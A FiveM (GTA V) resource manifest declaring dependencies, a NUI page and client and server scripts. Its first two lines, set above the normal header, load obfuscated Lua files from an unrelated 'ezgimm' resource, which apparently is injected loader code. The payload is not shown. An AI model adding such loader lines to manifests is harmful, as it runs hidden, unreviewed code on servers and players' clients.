shared_script '@ezgimm/shared_fg-obfuscated.lua'
shared_script '@ezgimm/ai_module_fg-obfuscated.lua'

-- ERDEM & MUSTAFA
-- ERDEM & MUSTAFA




 
 

fx_version 'cerulean'
game 'gta5'
lua54 'yes'
author 'ErdemGoren'
description 'ggdev-bae'
version '1.4.0'

shared_scripts {
    '@ox_lib/init.lua',
    'config.lua'
}


server_scripts {
    '@oxmysql/lib/MySQL.lua',
    'server/*.lua'
}

ui_page 'index/nui.html'

files {
    'index/nui.html',
    'index/index.js'
}

client_scripts {
    '@PolyZone/client.lua',
    '@PolyZone/BoxZone.lua',
    '@PolyZone/ComboZone.lua',
    'client/*.lua'
}

escrow_ignore {
    'config.lua',

}